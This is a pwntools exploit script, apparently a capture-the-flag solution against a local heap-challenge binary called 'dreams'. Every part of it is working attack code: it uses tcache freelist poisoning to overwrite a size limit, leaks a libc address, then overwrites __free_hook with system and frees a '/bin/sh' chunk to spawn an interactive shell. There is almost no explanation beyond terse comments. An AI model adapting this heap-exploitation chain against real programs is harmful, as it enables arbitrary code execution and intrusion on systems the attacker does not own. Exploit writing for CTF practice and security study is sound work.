from pwn import *

context.log_level="debug"
context.terminal=["konsole", "-e"]

p = process("./dreams")
e = ELF("./dreams")
libc = ELF("./libc.so.6")


def sleep(i, d, c):
    p.sendlineafter("> ", "1")
    p.sendlineafter("?", str(i))
    p.sendafter("?", d)
    p.sendafter("?", c)

def sell(i):
    p.sendlineafter("> ", "2")
    p.sendlineafter("?", str(i))

def psych(i, s):
    p.sendlineafter("> ", "3")
    p.sendlineafter("?", str(i))
    p.sendafter(":", s)


# overwrite MAX_DREAMS
sleep(0, "AAAA", "AAAA")
sleep(1, "BBBB", "BBBB")
sell(0)
sell(1)

psych(1, p64(e.sym["MAX_DREAMS"]-0x10))
sleep(2, p64(0), "BBBB")
sleep(3, "iiiiiiii", p64(0) + p64(0x31331))

# leak libc
sleep(4, "AAAA", "AAAA")
sleep(7, "BBBB", "BBBB")
sell(4)
sell(7)

psych(7, p64(e.sym["dreams"]))
sleep(8, p64(0), "BBBB")
sleep(9, "\x28", p64(0))

psych(9, p64(e.sym["MAX_DREAMS"]))

# psych but split up
p.sendlineafter("> ", "3")
p.sendlineafter("?", "1")

p.recvuntil("that ")

libc.address = u64(p.recv(6)+"\x00\x00") - 0x1ed723


p.sendafter(":", p64(0xfbad2887))

print("libc", hex(libc.address))

# overwrite free hook zzz
sleep(2, "asdf", "asdf")
sleep(4, "asdf", "asdf")

sell(2)
sell(4)
psych(4, p64(libc.sym["__free_hook"]-0x8))

sleep(5, "asdf", "asdf")
sleep(6, "/bin/sh", p64(libc.sym["system"]))


sell(6)

p.interactive()
